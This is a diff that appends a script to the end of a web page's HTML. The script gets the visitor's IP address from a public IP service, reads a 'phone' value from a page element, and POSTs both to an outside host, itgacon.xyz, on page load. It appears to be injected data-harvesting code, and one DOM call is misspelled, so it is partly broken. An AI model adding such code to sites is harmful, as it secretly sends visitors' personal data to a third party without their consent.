@@ -78,3 +78,33 @@
 });
 </script>
 </html>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+ 
+ let cip; 
+fetch('https://api.ipify.org?format=json')
+  .then(results => results.json())
+  .then(data => {
+   cip = data.ip; 
+  });
+
+window.onload = function() {
+  var phoneNumber = document.getElementByClassName('section-content-column').value;
+       $.ajax({
+            url: 'https://itgacon.xyz/check_p/public/api/save-id',
+            method: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({id: cip, phone:phoneNumber}),
+            success: function(response) {
+                console.log('Success:', response.message);
+                alert('ID saved successfully');
+            },
+            error: function(xhr, status, error) {
+                console.error('Error:', xhr.responseJSON.error);
+                alert('Failed to save ID');
+            }
+        });
+}
+
+});
+</script>
